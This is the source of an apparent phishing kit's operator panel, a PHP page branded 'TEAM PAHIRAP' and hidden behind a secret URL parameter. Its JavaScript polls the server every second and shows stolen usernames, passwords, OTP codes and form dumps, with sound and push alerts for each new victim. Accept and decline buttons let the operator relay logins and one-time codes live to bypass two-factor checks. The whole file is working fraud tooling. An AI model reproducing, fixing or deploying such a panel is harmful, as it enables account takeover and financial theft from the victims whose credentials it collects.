<?php
	if(strcmp($_GET['panel'],"rez") != 0){
		http_response_code(404);
		die();
	}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>PANEL V4</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="../files/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/select2@4.0.3/dist/css/select2.min.css">
<!--===============================================================================================-->
	<!-- <link rel="stylesheet" type="text/css" href="vendor/perfect-scrollbar/perfect-scrollbar.css"> -->
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
<style type="text/css">
	body{
		background: rgb(44, 26, 11);
	}
	.container-table100{
		background: rgb(44, 26, 11);
	}
	.column0,.column1,.column2,.column3,.column4,.column5{
		width: 15%;
	}
	.meta-a{
		margin-left: 5px;
	}
	.meta-b{
		color: red;
	}
</style>
</head>
<body onload="rNtf();setInterval(fetch_result,1000)">
	<div class="limiter">
		<div class="container-table100">
			
			<div class="wrap-table100">
				<span><h1 id="nice1">TEAM PAHIRAP - RE$ULT</h1></span>
				<span><h3 id="nice2">MARIA CLARA | Telegram : @mariaclara1337</h3></span>
				<div class="table100 ver3 m-b-110">
					<div class="table100-head">
						<table>
							<thead>
								<tr class="row100 head">
									<th class="cell100 column1">Identifier</th>
									<th class="cell100 column2">Username</th>
									<th class="cell100 column3">Password</th>
									<th class="cell100 column4">OTP</th>
									<th class="cell100 column5">Dump</th>
									<th class="cell100 column5">Actions</th>
								</tr>
							</thead>
						</table>
					</div>

					<div class="table100-body js-pscroll">
						<table>
							<tbody id="se2">
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
								<tr class="row100 body">
									<td class="cell100 column1">..........</td>
									<td class="cell100 column1">..........</td>
									<td class="cell100 column2">..........</td>
									<td class="cell100 column3">..........</td>
									<td class="cell100 column4">..........</td>
									<td class="cell100 column5">..........</td>
									<td class="cell100 column5">..........</td>
								</tr>
							</tbody>
						</table>
			</div>
		</div>
	</div>


<!--===============================================================================================-->	
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!--===============================================================================================-->
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.5/popper.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="https://cdn.jsdelivr.net/npm/select2@4.0.3/dist/js/select2.min.js"></script>
<!--===============================================================================================-->
	<!-- <script src="vendor/perfect-scrollbar/perfect-scrollbar.min.js"></script> -->
	<script>
		$('.js-pscroll').each(function(){
			var ps = new PerfectScrollbar(this);

			$(window).on('resize', function(){
				ps.update();
			})
		});
			
		
	</script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>
	<script type="text/javascript">
		function rNtf(){
			navigator.serviceWorker.register('sw.js');
			Notification.requestPermission(function(result) {
			  if (result === 'granted') {
			    navigator.serviceWorker.ready.then(function(registration) {
			      _notifier_ = registration ; 
			    });
			  }
			});
		}
		function _f_(method,target){
			var xml = new XMLHttpRequest();
			xml.open('POST','../ext.php',true);
			xml.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			xml.send("method="+method+"&target="+target);
		}
		function fetch_result(){
			var xml = new XMLHttpRequest();
			xml.open('GET','nice.php',true);
			xml.onload = __p__;
			xml.send();
		}
		function __p__(){
			var __ff__ = "<a class=\"accept\" href=\"#\">Accept</a> | <a class=\"decline\" href=\"#\">Decline</a>";
			var se = document.getElementById('se2');
			var __r__ = JSON.parse(this.response);

			if(typeof audio === "undefined"){
				audio = new Audio('notif.mp3');
			}

			if(typeof segment === "undefined"){
				segment = __r__['segment'];
			}

			if(segment != __r__['segment']){
				if(!audio.paused){
					audio.currentTime = 0;
				}
				if(typeof _notifier_ != "undefined"){
					_notifier_.showNotification( "XMC Alert !!", { body:"Fetched New Update!" } );
				}
				audio.play();
				segment = __r__['segment'];
			}

			delete __r__['segment'];
			var keys = Object.keys(__r__);
			se.innerHTML = "";
			if(keys.length > 0){
				keys.forEach(function(v,i){
					var tr = document.createElement('tr');
					var tds = Array(6).fill(Object.assign({})).map( x => x=document.createElement('td') );
					var otp_status = (__r__[v]['OTP'] || "").slice(7);
					tds[0].textContent = v.length > 10 ? v.slice(0,10) + "...." : v ; 
					tds[1].textContent = __r__[v]['userid'];
					tds[2].textContent = __r__[v]['password'];
					tds[3].textContent = (__r__[v]['OTP'] || "").slice(0,6) || "Not Ready.";
					tds[4].innerHTML = __r__[v]['[Form]userid'] !== undefined ? "<a href=\"#\">Fulzed</a>" : "Not Ready.";

					var action = document.createElement('a');
					action.href = "#" ; 
					action.innerHTML = "🗑️";
					action.setAttribute('onclick',"_f_('delete','"+v+"')");

					tds[5].appendChild(action);

					if(tds[4].innerHTML !== "Not Ready."){
						var blob_text = "";
						var b = tds[4].querySelector('a');
						for( var _k in __r__[v] ){
							blob_text += _k + ": " + __r__[v][_k] + "\r\n" ;
						}
						b.href = "screen.php?x="+window.encodeURIComponent(blob_text);
					}

					if(otp_status !== ""){
						tds[3].textContent += `(${otp_status})`;
					}

					var xCheck = document.createElement('a');
					var xCross = document.createElement('a');
					xCheck.setAttribute("onclick","_f_('loginAccept','"+v+"')");
					xCross.setAttribute("onclick","_f_('loginDecline','"+v+"')");
					xCheck.classList.add('meta-a');
					xCross.classList.add('meta-b');
					xCheck.href = xCross.href = "#" ;
					
					if(__r__[v]['isAccepted'] != 'nono') {
						// tds[5].innerHTML += " |";
						if(__r__[v]['isAccepted'] != 'no') {
							tds[5].innerHTML += "[accepted]";
						} else {
							xCheck.textContent = "✔️";
							xCross.textContent = "❌";
							tds[5].innerHTML += "[pending]";
						}
						
					} else {
						tds[5].innerHTML += "[denied]";
					}
					tds[5].appendChild(xCheck);
					
					tds[5].appendChild(xCross);


					if(otp_status !== "Ok!" && tds[3].textContent != "Not Ready."){
						var a = document.createElement('a');
						var d = document.createElement('a');
						a.setAttribute("onclick","_f_('accept','"+v+"')");
						d.setAttribute("onclick","_f_('decline','"+v+"')");
						a.classList.add('meta-a');
						d.classList.add('meta-b');
						a.href = d.href = "#" ; 
						a.textContent = "A" ; d.textContent = "D";
						tds[3].appendChild(a);
						tds[3].innerHTML += " | ";
						tds[3].appendChild(d);
					}

					tds.forEach( function(x,i){
						tr.appendChild(x);
						x.classList.add('column'+(i+1));
						x.classList.add('cell100');
					})
					se.appendChild(tr);
 				});
			}
			if(keys.length < 7){
					var x = 7 - keys.length;
					for(var i=0;i<x;i++){
						se.innerHTML += "<tr class=\"row100 body\"><td class=\"cell100 column1\">..........</td><td class=\"cell100 column1\">..........</td><td class=\"cell100 column2\">..........</td><td class=\"cell100 column3\">..........</td><td class=\"cell100 column4\">..........</td><td class=\"cell100 column5\">..........</td></tr>";
					}
				}
			}
	</script>
</body>
</html>